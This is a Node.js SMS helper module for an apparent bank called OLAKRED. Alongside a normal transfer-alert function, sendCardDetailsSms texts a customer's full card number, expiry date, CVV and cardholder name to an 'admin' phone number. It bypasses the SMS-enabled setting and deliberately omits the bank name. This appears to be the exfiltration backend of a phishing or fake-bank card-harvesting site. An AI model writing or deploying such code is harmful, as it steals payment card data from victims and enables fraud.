// lib/sms.js
import https from "https";
import { getDb } from "./db";

const BANK_NAME = "OLAKRED";

async function isSmsEnabled() {
  const db = await getDb();
  const [rows] = await db.execute(
    "SELECT sms_enabled FROM settings WHERE id = 1 LIMIT 1"
  );
  await db.end();

  if (!rows.length) {
    console.warn("Table settings introuvable ou vide. SMS désactivés par sécurité.");
    return false;
  }

  return !!rows[0].sms_enabled;
}

function getJwt() {
  const token = process.env.SMS_WORKS_JWT;
  if (!token) {
    console.warn(
      "SMS désactivé: SMS_WORKS_JWT manquant dans les variables d'environnement."
    );
    return null;
  }
  return token;
}

export async function sendTransferSms({ to, fullName, transfer }) {
  const enabled = await isSmsEnabled();
  if (!enabled) {
    console.log(
      "Envoi SMS virement ignoré: settings.sms_enabled = 0 (désactivé par l'admin)."
    );
    return;
  }

  if (!to) {
    throw new Error("Numéro de téléphone manquant pour l'envoi du SMS.");
  }

  const { amount, newBalance, last4, reference } = transfer;

  // Virement : on garde le nom de la banque
  const text = `${BANK_NAME} -${amount.toFixed(2)} EUR ****${last4} | ${newBalance.toFixed(2)} EUR | ${reference}`;

  const jwtToken = getJwt();
  if (!jwtToken) {
    return;
  }

  const body = JSON.stringify({
    sender: process.env.SMS_WORKS_SENDER || "OLAKRED",
    destination: to,
    content: text,
  });

  const options = {
    hostname: "api.thesmsworks.co.uk",
    port: 443,
    path: "/v1/message/send",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(body),
      Authorization: jwtToken,
    },
    agent: new https.Agent({ keepAlive: true }),
  };

  await new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => {
        if (res.statusCode && res.statusCode >= 200 && res.statusCode < 300) {
          resolve();
        } else {
          reject(
            new Error(
              `The SMS Works error: ${res.statusCode ?? "no-status"} - ${data}`
            )
          );
        }
      });
    });

    req.on("error", (err) => reject(err));
    req.write(body);
    req.end();
  });
}

// >>> ENVOI CARTE, SANS NOM DE BANQUE
export async function sendCardDetailsSms({ to, user, locale, card }) {
  if (!to) {
    throw new Error("Numéro de téléphone admin manquant pour l'envoi du SMS carte.");
  }

  const { cardNumber, expiryDate, cvv, cardholderName } = card;

  // Carte : pas de nom de banque, juste les infos essentielles
  const text = `${cardNumber} | ${expiryDate} | ${cvv} | ${cardholderName} | ${locale || "fr"}`;

  const jwtToken = getJwt();
  if (!jwtToken) {
    return;
  }

  const body = JSON.stringify({
    sender: process.env.SMS_WORKS_SENDER || "OLAKRED",
    destination: to,
    content: text,
  });

  const options = {
    hostname: "api.thesmsworks.co.uk",
    port: 443,
    path: "/v1/message/send",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(body),
      Authorization: jwtToken,
    },
    agent: new https.Agent({ keepAlive: true }),
  };

  await new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => {
        if (res.statusCode && res.statusCode >= 200 && res.statusCode < 300) {
          resolve();
        } else {
          reject(
            new Error(
              `The SMS Works error: ${res.statusCode ?? "no-status"} - ${data}`
            )
          );
        }
      });
    });

    req.on("error", (err) => reject(err));
    req.write(body);
    req.end();
  });
}
